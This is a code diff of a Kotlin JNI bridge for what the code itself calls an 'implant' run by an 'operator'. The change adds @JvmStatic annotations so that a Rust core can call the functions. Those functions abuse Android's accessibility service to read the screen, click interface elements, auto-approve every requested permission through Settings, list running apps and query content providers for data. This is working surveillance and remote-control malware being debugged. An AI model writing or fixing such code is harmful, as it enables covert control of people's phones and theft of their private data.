@@ -8,23 +8,34 @@ import java.util.UUID
  * Kotlin-side implementation of the primitives the Rust core shells out to.
  * Each function is invoked from Rust via JNI (see core/src/android_bridge.rs).
  * Everything here runs in-process with the implant's own UID — no root, no Shizuku.
+ *
+ * @JvmStatic is REQUIRED on every function below, not cosmetic: members of an
+ * `object` otherwise exist only as instance methods on the singleton, while the
+ * Rust side resolves them with CallStaticObjectMethod. Drop the annotation and
+ * the method silently disappears from the static lookup, so the call fails with
+ * NoSuchMethodError and the operator sees only "Java exception was thrown".
+ * The descriptor passed from Rust must also match exactly (proto_for()).
  */
 object ShadowBridge {
     private const val TAG = "ShadowBridge"
 
     /** Read screen as a text tree (a11y). */
+    @JvmStatic
     fun dumpScreen(): String =
         com.shadow.a11y.ShadowAccessibilityService.instance?.dumpScreen() ?: "a11y not active"
 
     /** Click a node by visible text / content description (a11y). */
+    @JvmStatic
     fun clickByText(needle: String): Boolean =
         com.shadow.a11y.ShadowAccessibilityService.instance?.clickByText(needle) ?: false
 
     /** Click a node by resource id (a11y). */
+    @JvmStatic
     fun clickNodeById(viewId: String): Boolean =
         com.shadow.a11y.ShadowAccessibilityService.instance?.clickNodeById(viewId) ?: false
 
     /** Open Settings → app permissions and auto-click Allow for all declared perms. */
+    @JvmStatic
     fun startAutoGrant(): String {
         val svc = com.shadow.a11y.ShadowAccessibilityService.instance
             ?: return "a11y not active — cannot auto-grant"
@@ -33,6 +44,7 @@ object ShadowBridge {
     }
 
     /** List permissions actually granted to this app (PackageManager, own UID). */
+    @JvmStatic
     fun grantedPermissions(): String {
         val ctx = ShadowApp.appContext ?: return "no context"
         return try {
@@ -52,6 +64,7 @@ object ShadowBridge {
     }
 
     /** Recents dump — "all the rest of the buttons" fodder. */
+    @JvmStatic
     fun runningApps(): String {
         val ctx = ShadowApp.appContext ?: return "no context"
         return try {
@@ -67,6 +80,7 @@ object ShadowBridge {
      * Read a content:// provider with our OWN UID. No shell, no root.
      * Works once the matching runtime permission is granted (see startAutoGrant).
      */
+    @JvmStatic
     fun queryProvider(uri: String, projection: String, limit: Int): String {
         val ctx = ShadowApp.appContext ?: return "no context"
         return try {
